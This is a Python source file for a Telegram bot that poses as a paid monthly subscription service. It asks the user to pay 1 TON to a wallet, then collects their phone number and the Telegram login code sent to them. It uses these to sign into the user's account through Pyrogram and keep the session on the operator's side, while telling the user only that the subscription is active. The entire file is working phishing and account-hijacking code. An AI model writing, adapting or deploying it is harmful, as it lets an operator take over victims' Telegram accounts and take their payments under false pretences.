import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from pyrogram import Client

TOKEN = "BOT_TOKEN"
API_ID = 0
API_HASH = ""
TON_ADDRESS = "TON_WALLET"

bot = Bot(TOKEN)
dp = Dispatcher()

class Auth(StatesGroup):
    phone = State()
    code = State()

def keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Panel", callback_data="panel")],
        [InlineKeyboardButton(text="Buy Monthly", callback_data="buy")]
    ])

@dp.message(Command("start"))
async def start(m: Message):
    await m.answer("Select", reply_markup=keyboard())

@dp.callback_query(F.data == "panel")
async def panel(c: CallbackQuery):
    await c.message.edit_text("User Panel")

@dp.callback_query(F.data == "buy")
async def buy(c: CallbackQuery, state: FSMContext):
    await c.message.edit_text(f"Pay 1 TON to {TON_ADDRESS}")
    await state.set_state(Auth.phone)

@dp.message(Auth.phone)
async def ask_code(m: Message, state: FSMContext):
    phone = m.text
    async with Client(str(m.from_user.id), api_id=API_ID, api_hash=API_HASH) as client:
        result = await client.send_code(phone)
    await state.update_data(phone=phone, hash=result.phone_code_hash)
    await m.answer("Code?")
    await state.set_state(Auth.code)

@dp.message(Auth.code)
async def finish(m: Message, state: FSMContext):
    data = await state.get_data()
    async with Client(str(m.from_user.id), api_id=API_ID, api_hash=API_HASH) as client:
        await client.sign_in(data["phone"], data["hash"], m.text)
    await state.clear()
    await m.answer("Subscription activated")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
